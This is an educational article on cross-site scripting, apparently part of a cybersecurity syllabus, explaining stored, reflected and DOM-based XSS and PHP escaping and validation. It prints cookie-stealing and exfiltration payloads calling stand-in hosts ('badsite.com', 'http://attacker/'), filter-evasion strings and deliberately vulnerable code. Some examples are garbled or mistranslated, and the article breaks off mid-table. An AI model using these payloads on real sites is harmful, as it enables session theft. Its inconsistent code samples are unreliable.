---
title: "XSS (cross-site scripting)"
subtitle: "Mastering all about Cross-site scripting "
tags: ["pentesting", "cybersecurity", "red-team"]
authors: ["blindma1den", "lorenagubaira"]

---

Cross-site scripting (XSS) is a type of security vulnerability that allows an attacker to inject malicious code into a web page viewed by other users. The add-on does not sanitize and escapes some of its pop-up options, allowing users with a role as low as Contributor to perform cross-site scripting attacks between stored sites, which could be used against administrators.

Cross-site scripting vulnerabilities occur when a lack of input validation allows users to inject script code into the target website so that it runs in the browser of another user visiting the same website. This would circumvent the browser's same-origin policy, as it cannot distinguish authentic from inauthentic script code, apart from its origin.

According to Wordfence analysis, Cross Site Scripting vulnerabilities are the most common vulnerability found in WordPress plugins by a significant margin.

![XSS1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss1.png?raw=true)

As you can see from the chart above, if you can fully understand and eliminate only XSS vulnerabilities in your PHP code, you will write 47% fewer vulnerabilities. So let's spend some time analyzing XSS, what it is, how it is exploited, and how to prevent XSS vulnerabilities.

Many web applications have input vectors that users can interact with. When those inputs are reflected in the content of a page and are not sanitized or filtered sufficiently, attackers can attempt to inject malicious code to alter that page. The most common attacks that exploit these vulnerabilities are XSS (Cross-Site Scripting) and defacement attacks. While this type of defacement only alters the visual appearance of a website, an XSS can allow attackers to inject code/scripts (JavaScript, for example) that will be executed by victims' browsers, thus causing much more problems for users.

Executing arbitrary code in a victim's browser can allow an attacker to perform **cookie stealing** (when cookies are not protected, attackers can steal them and use them to authenticate themselves as victims without having to know their password), **keylogging** (attackers can spy on victims and retrieve their keystrokes) or **Phishing** (attackers can change the appearance and behavior of the site and trick victims into sending sensitive information to the attackers' servers).

### But what is an XSS vulnerability?

XSS vulnerabilities are incredibly easy to write. In fact, if you simply write PHP in a way that seems intuitive, you will almost certainly write an XSS vulnerability into your code. Fortunately, XSS vulnerabilities are also very easy to recognize.

| 1 | echo "The value you entered is: ". $_GET['val']; | 

This is a classic XSS vulnerability. If you include this code in a WordPress plugin, publish it, and your plugin becomes popular, you can have no doubt that a security analyst will at some point contact you to report this vulnerability. You'll have to fix it and the analyst will make it public, leaving you a bit embarrassed, but with a more secure application.

So why is this an XSS vulnerability? The way the above code works is that it takes a value from the URL and writes it back to the browser, without validation or filtering. If your application is hosted at [https://example.com/test.php](https://example.com/test.php), a site visitor could visit the following URL:

> https://ejemplo.com/test.php?val=123

They will then see: "The value you entered is: 123" in their browser. Probably the way the application was designed to work.

If someone visits the following URL:

> https://example.com/test.php?val=<script>alert('Prove this is an XSS');</script>.

They will see the following in the browser, "The value you entered is:" and they will also see a pop-up alert box that says "Proves this is an XSS."

### Why is unfiltered output dangerous?

A demo that displays an alert box doesn't seem like much of a threat. If you don't fully understand the impact of an XSS vulnerability and someone reports this problem to you with an `alert()` box as a demonstration of the vulnerability, you may not take it seriously. How can proof that you can execute JavaScript be proof of a serious security problem?

When an analyst sends you an alert() box as proof of a security vulnerability, they are demonstrating that they can execute arbitrary JavaScript code in the browser. What they are really demonstrating is that by sending that URL to someone else, they can get that other person to execute arbitrary javascript in a browser.

### One version of an exploit might look like this

[https://example.com/test.php?val=<script](https://example.com/test.php?val=%3cscript) src="http://badsite.com/badscript.js"></script>

The attacker will send that link to a victim. The steps are as follows:

- The victim clicks on the link and visits the site. Let's assume they are already logged into the website with administrator level access.
- The link and the XSS vulnerability cause the script to load from an external website to the target web page.
- The script will have full access to the browser DOM environment, including any HTTP cookies that are not protected by the HttpOnly flag.
- The script performs a malicious action as a logged-in user. It also steals data from the website that the logged-in user can access (e.g., private messages that the user has received) and sends it to the attacker. The data can be sent in several ways, but one could be to load an image like this from an external website: [http://badsite.com/badPretendImage.jpg?stolendata=secretDataValues](http://badsite.com/badPretendImage.jpg?stolendata=secretDataValues). badPretendImage.jpg is a script that displays an image but also stores the received data.

That is the basic mechanism of exploiting an XSS vulnerability: an attacker finds a way to make a victim load their javascript using an XSS vulnerability in the website. They use it to steal data from browsers.

In the example above, we have loaded an external javascript file on the page. XSS vulnerabilities vary, and for a particular vulnerability, it may not be feasible to include <SCRIPT> tags that load a complete external script. If that doesn't work, what might work is to add javascript directly into the exploit that executes and performs some malicious action.

### What is the HttpOnly flag, and why is it important?

Before Internet Explorer version 6SP1, cookies were accessible to both web servers when a browser made a request and JavaScript. In other words, a script running in a particular website's browser could simply read all the cookies that the website had set.

This provided a lot of flexibility to developers, but it also allowed malicious scripts to read cookie values and send them anywhere on the Internet. If an attacker could exploit an XSS vulnerability, the first thing they would do would be to steal all the cookies they could read. This would allow them to gain instant administrative-level access to websites if the victim was logged into the target website as an administrator.

In 2002, Microsoft released a feature with Internet Explorer Service Pack 1 that provided an optional special flag that could be set when a cookie was set. The flag is called HttpOnly and specifies that any cookie that includes the HttpOnly flag should not be readable by javascript and should only be sent to the web server that sets the cookie via HTTP. Hence, the name 'HttpOnly'. Other browser vendors quickly adopted the feature because the security benefits were clear. This flag provided a robust way to protect sensitive cookies from XSS attacks. Today, all major browser vendors support the HttpOnly flag.

WordPress also uses the HttpOnly flag to protect cookies, which prevents an attacker from exploiting an XSS vulnerability to steal sensitive cookies.

Tip: Changing a WordPress user's password invalidates their cookies immediately. This can be used to log out a user in the event of a suspected breach.

### Consequences

This can allow the attacker to steal sensitive information, such as login credentials or personal data, or perform actions on behalf of the victim, such as making unauthorized transactions or posting spam.

Stored XSS, in particular, occurs when malicious code is permanently stored on the website, allowing it to affect any user who visits the affected page. Consequences may include financial losses, data leaks, or damage to the reputation of the website.

The main consequences of XSS are:

- **Information theft:** An attacker can steal sensitive user information, such as login credentials, banking information, or personal data.
- **Phishing attacks:** XSS can be used to trick users into providing personal or sensitive information, such as passwords or credit card numbers.
- **Content manipulation:** It can also be used to manipulate the content of a website, for example, to display fake messages, redirect users to malicious sites or even to change the appearance of the website.
- **Session hijacking:** It is possible to inject malicious code that intercepts a user's session, allowing it to perform actions on the user's behalf.
- **Malware spreading:** An attacker can also use XSS to inject malicious code that downloads and executes malware on the user's computer without the user's knowledge or consent.
- The exact impact depends largely on the application.
- XSS is generally a threat to web applications that have authenticated or security-sensitive users.
- Malicious code may be able to manipulate site content, changing its appearance and/or function for another user.
- This includes modifying the behavior of the web application (such as redirecting forms, etc.).
- The code may also be able to perform actions within the application without the user's knowledge.
- Script code can also obtain and retransmit cookie values if they have not been set to HttpOnly.

### There are 3 main types of XSS

- **Stored**: the user's input is stored on the website. It usually occurs in user profiles, forums, chats, etc. Where user content is stored permanently (or temporarily). Attackers can inject malicious payloads and all users browsing the infected page will be affected. This is one of the most dangerous forms of XSS because exploitation does not require phishing and can affect many users. XSS on pages where only the attacker's user has the right to browse (e.g. the user's configuration page) is called self-XSS and is considered to have an impact close to 0 since, theoretically, it cannot affect other users.
- **Reflected**: User input is reflected, but not stored. It usually occurs in search forms, login pages, and pages that mirror content for a single response. When the vulnerable reflected input is in the URI ([http://www.target.com/search.php?keyword=INJECTION](http://www.target.com/search.php?keyword=INJECTION)), attackers can create a malicious URI and send it to victims in the hope that they will scan it. This form of XSS usually requires phishing, and attackers can limit the length of the malicious payload.
- **DOM-based: While stored and reflected XSS attacks exploit vulnerabilities in server-side code, a DOM-based XSS exploits those on the client-side (e.g., JavaScript used to help dynamically render a page). DOM-based XSSs generally affect user input that is temporarily reflected, as do reflect XSS attacks.

## Practice:

Evaluators should identify the input vectors (parts of the application that accept content from users) that are stored or reflected.

- URI Parameters for Reflected and DOM-based XSS
- Other user input in forums, chats, comments, posts, and other stored content for stored XSS
- HTTP headers such as cookies (and even user agents in some cases).

One of the most famous payloads is <script>alert('XSS');</script>opening a popup window that echoes "XSS". However, exploiting XSS is like playing "cat and mouse". Inputs can be filtered and filters can be skipped. Below are some basic examples of XSS payloads.

```html
<script>alert('XSS');</script>

<IMG SRC=JaVaScRiPt:alert('XSS')>

<IMG onmouseover="alert('XSS')">

<<SCRIPT>alert("XSS");//<</SCRIPT>
```

> The following [website](https://transformations.jobertabma.nl/) ([GitHub project](https://github.com/jobertabma/transformations)) can help identify transformations applied to user input. This can help circumvent filters and transformations to exploit XSS attacks.

The following payload is used to test SQL injections, XSS (Cross-Site Scripting), and SSTI (Server-Side Template Injection).

```html
'"<svg/onload=prompt(5);>{{7*7}}
```

Tools such as [XSStrike](https://github.com/s0md3v/XSStrike) (Python) and [XSSer](https://github.com/epsylon/xsser) (Python) can also help find and exploit vulnerable XSS input vectors by merging them with unique payloads and then looking for unique patterns in the responses.

The attacker does not directly target his victim. Instead, he exploits a vulnerability in a website that the victim visits, so that the website delivers the malicious JavaScript to him. To the victim's browser, the malicious JavaScript appears to be a legitimate part of the website and therefore the website has acted as an unwitting accomplice of the attacker.

# How the malicious JavaScript is injected

The only way for the attacker to execute his malicious JavaScript in the victim's browser is to inject it into one of the pages that the victim downloads from the website. This can happen if the website directly includes user input on its pages because the attacker can insert a string that the victim's browser will treat as code.

In the following example, a simple server-side script is used to display the last comment on a website:

```python
print "<html>"

print "Latest comment:"

print database.latestComment

print "</html>"
```

The script assumes that a comment consists of text only. However, since the user input is included directly, an attacker could send this comment: "<script>...</script>". Any user visiting the page will now receive the following response:

```html
<html>

Latest comment:

<script>...</script>

</html>
```

When the user's browser loads the page, it will execute any JavaScript code contained within the <script> tags. The attacker has now succeeded in his attack.

## What is malicious JavaScript?

At first, the ability to execute JavaScript in the victim's browser may not seem particularly malicious. After all, JavaScript runs in a very restricted environment that has extremely limited access to the user's files and operating system. In fact, you could open your browser's JavaScript console right now and run any JavaScript you want, and it would be highly unlikely to cause any harm to your computer.

However, the possibility of JavaScript being malicious becomes clearer when you consider the following facts:

- JavaScript has access to some of the user's sensitive information, such as cookies.
- JavaScript can send HTTP requests with arbitrary content to arbitrary destinations using XMLHttpRequestof other mechanisms.
- JavaScript can make arbitrary modifications to the HTML of the current page using DOM manipulation methods.

These combined facts can lead to very serious security flaws, as we will explain below.

### The consequences of malicious JavaScript

Among many other things, the ability to execute arbitrary JavaScript in another user's browser allows an attacker to perform the following types of attacks:

### Cookie stealing

The attacker can access the victim's cookies associated with the website via document.cookie, send them to his server, and use them to extract sensitive information such as session IDs.

### Keylogging

The attacker can register a keyboard event detector addEventListenerand then send all the user's keystrokes to their server, potentially logging sensitive information such as passwords and credit card numbers.

## Phishing

The attacker can insert a fake login form into the page via DOM manipulation, configure the form's actionattribute to point to their server, and then trick the user into submitting sensitive information.

> ðŸ‘‰ Although these attacks differ significantly, they all have one crucial similarity: because the attacker has injected code into a page provided by the website, the malicious JavaScript is executed in the context of that website. This means that it is treated like any other script on that website: it has access to the victim's data for that website (such as cookies) and the hostname displayed in the URL bar will be that of the website. The script is considered a legitimate part of the website, allowing it to do anything that the actual website can do.

**This fact highlights a key issue:**.

*If an attacker can use your website to execute arbitrary JavaScript in another user's browser, the security of your website and its users has been compromised.* To emphasize this point, some examples in this tutorial will omit the details of a malicious script by displaying only <script>...</script>. This indicates that the mere presence of a script injected by the attacker is the problem, regardless of the specific code that executes the script.

## Actors in an XSS attack

Before describing in detail how an XSS attack works, we must define the actors involved in an XSS attack.Generally, it involves three actors: **the website**, **the victim**, and **the attacker**.

- **The website** provides HTML pages to users who request them. In our examples, it is located at [http://website/](http://website/).
- **The website's database** is a database that stores some of the user input included in the website's pages.
- **The victim** is a normal user of the website who requests pages from the website through his browser.
- **The attacker** is a malicious user of the website who intends to launch an attack against the victim by exploiting an XSS vulnerability on the website.
- **The attacker's server** is a web server controlled by the attacker for the sole purpose of stealing confidential information from the victim. In our examples, it is located at [http://attacker/](http://attacker/).

**An example attack scenario**

In this example, we will assume that the attacker's ultimate goal is to steal the victim's cookies by exploiting an XSS vulnerability on the website. This can be done by having the victim's browser parse the following HTML code:

```html
<script>

window.location='http://attacker/?cookie='+document.cookie

</script>
```

This script navigates the user's browser to a different URL, which triggers an HTTP request to the attacker's server. The URL includes the victim's cookies as a query parameter, which the attacker can extract from the request when it reaches his server. Once the attacker has acquired the cookies, he can use them to impersonate the victim and launch further attacks.

From now on, the above HTML code will be referred to as **malicious string** or **malicious script.** It is important to note that the string itself is only malicious if it is eventually parsed as HTML in the victim's browser, which can only occur as a result of an XSS vulnerability on the website.

## How the attack works

The following diagram illustrates how an attacker can perform this example attack:

![XSS2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss2.png?raw=true)

1. The attacker uses one of the website's forms to insert a malicious string into the website's database.
2. The victim requests a page from the website.
3. The website includes the malicious string from the database in the response and sends it to the victim.
4. The victim's browser executes the malicious script within the response and sends the victim's cookies to the attacker's server.

## Types of XSS

While the goal of an XSS attack is always to execute malicious JavaScript in the victim's browser, there are a few fundamentally different ways to achieve that goal. XSS attacks are usually divided into three types:

- **Persistent XSS**, where the malicious string originates in the website database.
- **Reflected XSS**, where the malicious string originates from the victim's request.
- **DOM-based XSS**, where the vulnerability is in the client-side code instead of the server-side code.

> ðŸ’¡ The previous example illustrated a persistent XSS attack. We will now describe the other two types of XSS attacks: reflected XSS and DOM-based XSS.

### Reflected XSS

In a reflected XSS attack, the malicious string is part of the victim's request to the website. The website then includes this malicious string in the response sent to the user. The following diagram illustrates this scenario:

![XSS3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss3.png?raw=true)

1. The attacker creates a URL containing a malicious string and sends it to the victim.
2. The attacker tricks the victim into requesting the URL of the website.
3. The website includes the malicious URL string in the response.
4. The victim's browser executes the malicious script within the response and sends the victim's cookies to the attacker's server.

**How can Reflected XSS be successful?**

At first, reflected XSS may seem harmless because it requires the victim himself to send a request containing a malicious string. Since no one would voluntarily attack themselves, there appears to be no way to perform the attack.

It turns out that there are at least two common ways to get a victim to launch a reflected XSS attack against themselves:

- If the user targets a specific individual, the attacker can send the malicious URL to the victim (via email or instant messaging, for example) and trick them into visiting it.
- If the user is targeting a large group of people, the attacker can post a link to the malicious URL (on their website or a social network, for example) and wait for visitors to click on it.

These two methods are similar and both can be more successful with the use of a URL shortening service, which masks the malicious string from users who might otherwise identify it.

What we discussed above is a reflected XSS vulnerability. A reflected XSS attack is usually a link containing malicious code. When someone clicks on that link, they are directed to a vulnerable website, and that malicious code is "reflected" back to their browser to perform some malicious action.

Reflected XSS attacks are much less dangerous than stored XSS vulnerabilities (see below) for several reasons:

Reflected XSS attacks rely on the victim performing some sort of action whereby they visit the target website and cause it to generate content that performs a malicious action in their browser. This makes reflected XSS attacks very difficult or sometimes impossible to automate. Each victim must be individually targeted with an email or some other content containing a malicious link that they must click on to be the target of the attack.

### DOM-based XSS

XDOM-based SS is a variant of both persistent and reflected XSS. In a DOM-based XSS attack, the victim's browser does not parse the malicious string until the website's legitimate JavaScript is executed. The following diagram illustrates this scenario for a reflected XSS attack:

![XSS4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss4.png?raw=true)

1. The attacker creates a URL containing a malicious string and sends it to the victim.
2. The attacker tricks the victim into requesting the URL of the website.
3. The website receives the request but does not include the malicious string in the response.
4. The victim's browser executes the legitimate script within the response, which causes the malicious script to be inserted into the page.
5. The victim's browser executes the malicious script inserted into the page and sends the victim's cookies to the attacker's server.

**What makes DOM-based XSS different?**

In the above examples of persistent and reflected XSS attacks, the server inserts the malicious script into the page, which is then sent as a response to the victim. When the victim's browser receives the response, it assumes that the malicious script is part of the legitimate content of the page and automatically executes it during page load as with any other script.

However, in the example of a DOM-based XSS attack, no malicious script is inserted as part of the page; the only script that is automatically executed during page load is a legitimate part of the page. The problem is that this legitimate script directly uses user input to add HTML to the page. Because the malicious string is inserted into the page using innerHTML, it is parsed as HTML, which causes the malicious script to execute.

**The difference is subtle but important:**

- In traditional XSS, the malicious JavaScript is executed when the page loads, as part of the HTML sent by the server.
- In DOM-based XSS, the malicious JavaScript is executed sometime after the page has loaded, as a result of the legitimate JavaScript on the page treating the user's input insecurely.

**Why DOM-based XSS is important**

In the example above, JavaScript was not necessary; the server could have generated all the HTML on its own. If the server-side code was free of vulnerabilities, the website would be safe from XSS.

However, as web applications become more advanced, JavaScript generates an increasing amount of HTML on the client side instead of on the server. Whenever it is necessary to change content without updating the entire page, the update must be done via JavaScript. In particular, this is the case when a page is updated after an AJAX request.

This means that XSS vulnerabilities can be present not only in the server-side code of your website but also in the client-side JavaScript code of your website. Consequently, even with completely secure server-side code, the client-side code could still insecurely include user input in a DOM update after the page has loaded. If this happens, the client-side code has enabled an XSS attack through no fault of the server-side code.

### DOM-based XSS invisible to the server

There is a special case of DOM-based XSS where the malicious string is never sent to the website server, to begin with, when the malicious string is contained in the fragment identifier of a URL (anything after the # character). Browsers do not send this part of the URL to the servers, so the website has no way to access it through server-side code. Client-side code, however, does have access to it and can therefore cause XSS vulnerabilities if handled insecurely.

This situation is not limited to fragment identifiers. Other user input that is invisible to the server includes new HTML5 functions such as LocalStorage and IndexedDB.

Stored (or persistent) XSS vulnerabilities

A stored XSS attack is much more dangerous for two reasons.

> First, a stored XSS attack can be automated. A script can be created that visits thousands of websites, exploits a vulnerability on each site, and drops a stored XSS payload.

> **Second, victims of a stored XSS attack do not have to take any action other than visiting the affected Web site**. Anyone who visits the affected page of the site will become a victim because the stored malicious code will be loaded into their browser. Victims do not need to take any additional action, such as clicking on an emailed link, to be affected.

A stored XSS attack occurs when an attacker sends malicious data to a website that is stored in a database or some other storage mechanism. Then, when other site visitors visit a specific page or URL, they receive that data which they execute and perform some type of malicious action. Let's look at an example:

![XSS5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss5.png?raw=true)

The above code is a very basic guestbook application. It is also a classic example of a stored XSS vulnerability. When you load this application, you will see a form asking you to sign a guestbook that looks like this:

![XSS6](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss6.png?raw=true)

Once you sign the guestbook several times, you will see something like this:

![XSS7](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss7.png?raw=true)

If you enter some javascript in the signature text box that runs an alert box, you'll see this:

![XSS8](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss8.png?raw=true)

What happened here is that a guest entered some JavaScript in the "Sign" field that looks like this:

| 1 | `<script>alert('XSS Expoit worked');</script>` |

The javascript was stored and is now delivered to all visitors to the guestbook page. This is a **stored XSS vulnerability** that has a much broader impact than a reflected XSS vulnerability. It can be used to steal data from every visitor to the affected page, not just visitors who click on a specially crafted link. For this reason, stored XSS vulnerabilities are much more serious than reflected XSS vulnerabilities.

Fixing this vulnerability is easy by validating the input and sanitizing and escaping the output. Let's apply that to this script. Check the changes below.

![XSS9](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss9.png?raw=true)

As you can see in the example above, we are validating the data using a regular expression. We now only allow a small subset of characters in the guestbook. Although we do not allow HTML tags, we run the data through PHP's filter_var() function with the FILTER_SANITIZE_STRING filter to sanitize the string, which will remove any tags that may be leaked due to an error in our code. FILTER_SANITIZE_STRING removes any tags it finds.

Then, when we generate each record in the guestbook, we use filter_var with the FILTER_SANITIZE_FULL_SPECIAL_CHARS filter, which does not remove tags but escapes them if they are present. So, in the above example, we are validating and sanitizing the input and escaping the output. This provides a lot of protection against a stored XSS in the case of a guestbook.

> ðŸ’­ **A side note on the above code:** You probably noticed some other things we could make more secure. For example, we store our guestbook in a file that is in a folder accessible from the web. That means that the public can read the raw data. This in itself is undesirable and giving an attacker read access to a file that is not designed for public consumption can introduce more vulnerabilities. One way around this is to create a data file but give it a PHP extension. Then make the first line of the file contain the following:

| 1 | `<?php die("Nothing to see here!"); ?>` | 

When writing to the file, make sure the first line remains intact. When reading the file, always discard the first line. Store the file with a .php extension, for example, data.php. Then, if an attacker tries to access the file, the web server will treat it as PHP executable and close it immediately.

# Methods to Prevent XSS

Remember that an XSS attack is a type of code injection: user input is misinterpreted as malicious program code. To prevent this type of code injection, secure handling of the input is necessary. For a web developer, there are two fundamentally different ways to perform secure input handling:

- **Coding**, which escapes user input so that the browser interprets it only as data, not code.
- **Validation**, which filters user input so that the browser interprets it as code without malicious commands.

> While these are fundamentally different methods of preventing XSS, they share several common characteristics that are important to understand when using any of them:

- **Context:** Secure input handling must be performed differently depending on where a page user input is inserted.
- **Inbound and outbound:** Secure input handling can be performed when your website receives the input (inbound) or just before your website inserts the input on a page (outbound).
- **Client Server:** Secure input handling can be performed on the client side or on the server side, both of which are necessary in different circumstances. Before explaining in detail how encryption and validation work, we will describe each of these points.

### Input handling contexts

There are many contexts on a web page where user input can be inserted. For each of these, specific rules must be followed so that user input cannot be taken out of context and interpreted as malicious code. The most common contexts are listed below:

| Context | Example Code |
| --- | --- |
| HTML element content | <div>userInput</div> |
| HTML attribute value | <input value="userInput"> |
| URL query value | http://example.com/?parameter=userInput |
| CSS value | color: userInput |
| JavaScript value | var name = "userInput"; |

### Why Context Matters

In all the described contexts, an XSS vulnerability would arise if user input is inserted before being encoded or validated for the first time. An attacker could, then inject malicious code simply by inserting the closing delimiter for that context and following it with the malicious code. For example, if a website ever inserts user information directly into an HTML attribute, an attacker could inject malicious script by starting their input with a quote, as shown below:

| Application Code | `<input value="userInput">` |
| --- | --- |
| Malicious String | `"><script>...</script><input value="` |
| Resulting Code | `<input value=""><script>...</script><input value="">` |

> ðŸ‘‰ This could be avoided by simply removing all quotes in the user input, and all would be well, but only in this context. If the same input were inserted in another context, the closing delimiter would be different and injection would be possible. For this reason, the safe handling of the input should always be adapted to the context where the user input will be inserted.

## Incoming and outgoing input handling

Instinctively, it might seem that XSS can be prevented by encrypting or validating all user input as soon as your website receives it. In this way, any malicious strings should already have been neutralized each time they are included on a page, and the scripts that generate HTML won't have to worry about secure input handling.

The problem is that, as described above, user input can be inserted in various contexts on a page. There is no easy way to determine when user input arrives and in which context it will eventually be inserted, and the same user input often must be inserted in different contexts. Therefore, relying on incoming input handling to avoid XSS is a very fragile solution that will be error-prone. (PHP's deprecated "[magic quotes](http://php.net/manual/en/security.magicquotes.php)" feature is an example of such a solution.)

Instead, outbound input handling should be your main line of defense against XSS, because it can take into account the specific context in which the user input will be inserted. That said, inbound validation can still be used to add a secondary layer of protection, as we will describe later.

### Where to perform secure input handling

In most modern web applications, user input is handled by both server-side code and client-side code. To protect against all types of XSS, secure input handling must be performed in both server-side code and client-side code.

- To protect against traditional XSS, secure input handling must be performed in the server-side code. This is done using any language supported by the server.
- To protect against DOM-based XSS where the server never receives the malicious string (such as the fragment identifier attack described above), secure input handling must be performed in the client-side code. This is done using JavaScript.

Now that we have explained why context is important, why the distinction between inbound and outbound input handling is important, and why secure input handling needs to be performed in both client-side and server-side code, we will continue by explaining how context works. Actually, two types of secure input handling (encoding and validation) are performed.

### Encryption

Encoding is the act of escaping user input so that the browser interprets it only as data, not code. The most recognizable type of encoding in web development is HTML escaping, which converts characters such as **<** and **>**into **&lt;**and **&gt;**, respectively.

The following pseudocode is an example of how user input could be encoded using HTML escaping and then inserted into a page using a server-side script:

```python
print "<html>"

print "Latest comment: "

print encodeHtml(userInput)

print "</html>"
```

If the user input were the string `<script>...</script>`, the resulting HTML would be:

```html
<html>

Latest comment:

&lt;script&gt;...&lt;/script&gt;

</html>
```

> ðŸ’¡ Because all characters with special meaning have been escaped, the browser will not parse any part of the user input as HTML.

## Encoding in client-side and server-side code

When coding in client-side code, the language used is always JavaScript, which has built-in functions that encode data for different contexts.

Also, you must rely on the functions available in the server-side language or framework. Due to the large number of languages and frameworks available, this tutorial will not cover the details of coding in any specific server-side language or framework. However, being familiar with the coding functions used on the client side in JavaScript is also helpful when writing server-side code.

### Client-side coding

When encoding user input on the client side using JavaScript, there are several built-in methods and properties that automatically encode all data based on the context:

| Context | Method/Property |
| --- | --- |
| content of the HTML element | node.textContent = userInput |
| value of the HTML attribute | element.setAttribute(attribute, userInput)
o
element[attribute] = userInput |
| URL query value | window.encodeURIComponent(userInput) |
| CSS value | element.style.property = userInput |

> ðŸ’¡ The last context mentioned above (JavaScript values) is not included in this list, because JavaScript does not provide a built-in way to encode the data to be included in the JavaScript source code.

## Limitations of encoding

Even with encoding, it will be possible to introduce malicious strings in some contexts. A notable example of this is when user input is used to provide URLs, as in the following example:

```javascript
document.querySelector('a').href = userInput;
```

Although assigning a value to the hrefproperty of an anchor element automatically hardcodes it to become nothing more than an attribute value, this in itself does not prevent the attacker from inserting a URL that begins with " javascript:". When the link is clicked, any JavaScript embedded within the URL will be executed.

Encryption is also an inadequate solution when you want the user to define some of the code on a page. Here's the translation:

An example is a user profile page where the user can define custom HTML. If this custom HTML were encoded, the profile page could consist solely of plain text.

In situations like these, encoding should be complemented with validation, which we will describe below.

### Validation

Validation is the act of filtering user input to remove all malicious parts, without necessarily removing all the code it contains. One of the most recognizable types of validation in web development is allowing some HTML elements (like `<em>` and `<strong>`) but not allowing others (like `<script>`).

Two main characteristics of validation differ between implementations:

1. **Classification Strategy**: User input can be classified using blacklists or whitelists.

2. **Validation Result**: User input identified as malicious can be either rejected or sanitized.

### Functions to validate your data

Validation in programming is when you verify that the data your application has received is within the constraints you define to ensure that it does not contain anything unreasonable, unnecessary, or malicious. **Validation does not replace sanitization or escaping**, because as we will see (in the section that discusses `filter_var()` below), malicious data can pass some validation functions.

The constraints you will use vary, but are often similar to the constraints used in a strictly typed language. For example, you might use some of the following checks:

- Is the data an integer (0 to 9 digits only)?
- Is the data a float and is a decimal point allowed (0 to 9 and . character)?
- Is the data numbers and dashes, for example, a credit card date field?
- Is the data a string with numbers, letters, spaces, and punctuation only?
- Is the data one of a limited number of selectable options, e.g. 'option1', 'option2', 'option3'?

During validation, if it rejects data, it will often return an error to the user describing the problem and prompting for the correct data.

Below, we have included functions that PHP developers frequently use to check if the data received by an application is valid (to validate data). Typically, they are used in an if() statement to check if the data is valid, and, if not, the application returns an error to the user.

| Function | What it does | Example |
| --- | --- | --- |
| `is_numeric()` | Tests if the data consists of digits from 0 to 9 with an optional sign and optional decimal point. | `is_numeric($input)` returns true if `$input == '-9.123'` |
| `preg_match()` | Tests if the data matches a regular expression. | `preg_match('/^[az]{2,3}$/', $input)` returns true if `$input` has lowercase letters of 2 or 3 characters. Note the `^` and `$` in the regular expression. |
| `filter_var()` | Tests if the data fits a built-in PHP filter. | `filter_var($input, FILTER_VALIDATE_EMAIL)` tests if `$input` is a valid email address. Other useful filters include `FILTER_VALIDATE_IP`, `FILTER_VALIDATE_URL`, `FILTER_VALIDATE_BOOLEAN`. http://php.net/manual/en/filter.filters.validate.php |
| `in_array()` | Tests if the data belongs to a range of allowed values. | `in_array($input, array('Windows', 'Linux', 'OSX', 'Other'))` returns true if `$input` contains one of the allowed values. Ideal for `<select>` fields and radio buttons in web forms. |

### How to safely use regular expressions for validation

When using regular expressions with `preg_match()` to validate data, be sure to match the entire string using a ^ caret at the beginning of your regular expression and a dollar sign $ at the end. These match the start and end of a string and will ensure that you are not just validating something in the middle of the input, but that you are validating the entire string. Omitting them creates a serious security problem because an attacker can include some valid data that will pass the test, but prepend or append anything malicious they want.

**The use of `filter_var()` for validation does not replace sanitization or escaping.

In general, the `filter_var()` function is used as follows to validate data as it arrives in your application:

| Example | Code |
| --- | --- |
| 1<br>2<br>3 | ```php<br>if ($test = filter_var('test@example.com', FILTER_VALIDATE_EMAIL)) {<br>    echo "Received: $test\n";<br>}<br>``` |

If you replace the above email with 'test@example.com<script>' you will see that the verification fails and the echo statement is not executed.

Consider the following example that demonstrates how malicious data can pass a validation step. This shows how validation is no substitute for sanitizing and escaping in the output.

| Example | Code |
| --- | --- |
| 1<br>2<br>3 | ```php<br>if ($test = filter_var('http://example.com/?%22%3e%3cscript%3ealert(%22XSS%22)%3c/script%3e%3ca%22%27', FILTER_VALIDATE_URL)) {<br>    echo "Received: $test\n";<br>}<br>``` |

The above example will generate the following:

| 1 | Received: http://example.com/?%22%3e%3cscript%3ealert(%22XSS%22)%3c/script%3e%3e%3ca" |

This creates an XSS vulnerability if this output is not sanitized and escaped. Changing the code as follows will eliminate the XSS vulnerability:

| Example | Code |
| --- | --- |
| 1<br>2<br>3 | ```php<br>if ($test = filter_var('http://example.com/?%22%3e%3cscript%3ealert(%22XSS%22)%3c/script%3e%3ca%22%27', FILTER_VALIDATE_URL)) {<br>    echo "Received: " . esc_url($test) . "\n";<br>}<br>``` |

El cÃ³digo anterior generarÃ¡ lo siguiente, que es seguro:

| 1 | Received: http://example.com/?scriptalert(XSS)/scripta |

See below for more information on the functions you can use to escape and disinfect.

### Functions to escape and sanitize your data

When you are ready to send data to a visitor's web browser, a file, a network, or some other place where data leaves your application, you need to make sure that the data you are sending is secure. PHP and WordPress provide a variety of functions that escape and/or sanitize your data. It is important to note that these functions will change your data if necessary to make it safe.

### PHP's built-in sanitizing and escaping functions

The following functions are built into PHP and you can use them whether you are running your application within the WordPress environment or not. You will notice that we provide several examples of `filter_var()`. This is the new standard in PHP sanitization and is included by default with PHP since PHP version 5.2. We recommend using `filter_var()` instead of older PHP functions.

| Function | Production | Description |
| --- | --- | --- |
| interval('123AA456') | 123 | Disinfect integers. [ http://php.net/manual/en/function.intval.php ] | |
| filter_var('brand<script>@example.com', FILTER_SANITIZE_EMAIL) | markscript@ejemplo.com | Disinfect emails. [ http://php.net/manual/en/filter.filters.sanitize.php ] | |
| filter_var('Testing <tags> & characters.', FILTER_SANITIZE_SPECIAL_CHARS) | Testing <tags> & characters. | Encodes special characters. [ http://php.net/manual/en/filter.filters.sanitize.php ] |
| filter_var('Remove <tag> & encode.', FILTER_SANITIZE_STRING); | Strip & encode. | Remove tags. [ http://php.net/manual/en/filter.filters.sanitize.php ] | |
| filter_var('Remove <label> and encode.', FILTER_SANITIZE_STRING, FILTER_FLAG_ENCODE_LOW | FILTER_FLAG_ENCODE_HIGH | FILTER_FLAG_ENCODE_AMP)
